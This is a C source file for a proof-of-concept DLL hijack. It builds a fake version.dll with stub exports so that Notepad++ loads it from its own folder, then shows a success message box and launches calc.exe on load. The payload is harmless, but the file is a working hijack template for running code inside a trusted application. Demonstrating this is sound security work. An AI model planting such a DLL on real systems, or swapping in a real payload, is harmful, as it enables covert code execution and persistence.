// you should  create a directory like DLLDemo and save the evil_version.c and version.def there 
// save system.config also in that directory

#include <windows.h>

// Stubs - no __declspec(dllexport) here, .def handles exports , its in tools/version.dll
BOOL WINAPI GetFileVersionInfoA(LPCSTR a, DWORD b, DWORD c, LPVOID d) { return FALSE; }
BOOL WINAPI GetFileVersionInfoW(LPCWSTR a, DWORD b, DWORD c, LPVOID d) { return FALSE; }
DWORD WINAPI GetFileVersionInfoSizeA(LPCSTR a, LPDWORD b) { return 0; }
DWORD WINAPI GetFileVersionInfoSizeW(LPCWSTR a, LPDWORD b) { return 0; }
BOOL WINAPI GetFileVersionInfoExA(DWORD a, LPCSTR b, DWORD c, DWORD d, LPVOID e) { return FALSE; }
BOOL WINAPI GetFileVersionInfoExW(DWORD a, LPCWSTR b, DWORD c, DWORD d, LPVOID e) { return FALSE; }
DWORD WINAPI GetFileVersionInfoSizeExA(DWORD a, LPCSTR b, LPDWORD c) { return 0; }
DWORD WINAPI GetFileVersionInfoSizeExW(DWORD a, LPCWSTR b, LPDWORD c) { return 0; }
BOOL WINAPI VerQueryValueA(LPCVOID a, LPCSTR b, LPVOID* c, PUINT d) { return FALSE; }
BOOL WINAPI VerQueryValueW(LPCVOID a, LPCWSTR b, LPVOID* c, PUINT d) { return FALSE; }
DWORD WINAPI VerFindFileA(DWORD a, LPSTR b, LPSTR c, LPSTR d, LPSTR e, PUINT f, LPSTR g, PUINT h) { return 0; }
DWORD WINAPI VerFindFileW(DWORD a, LPWSTR b, LPWSTR c, LPWSTR d, LPWSTR e, PUINT f, LPWSTR g, PUINT h) { return 0; }
DWORD WINAPI VerInstallFileA(DWORD a, LPSTR b, LPSTR c, LPSTR d, LPSTR e, LPSTR f, LPSTR g, PUINT h) { return 0; }
DWORD WINAPI VerInstallFileW(DWORD a, LPWSTR b, LPWSTR c, LPWSTR d, LPWSTR e, LPWSTR f, LPWSTR g, PUINT h) { return 0; }
DWORD WINAPI VerLanguageNameA(DWORD a, LPSTR b, DWORD c) { return 0; }
DWORD WINAPI VerLanguageNameW(DWORD a, LPWSTR b, DWORD c) { return 0; }

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            MessageBoxA(NULL,
                "DLL Hijack Successful!\nversion.dll was loaded from Notepad++ folder.",
                "DLL Hijack Demo",
                MB_OK | MB_ICONWARNING);
            WinExec("calc.exe", SW_SHOW);
            break;
    }
    return TRUE;
}
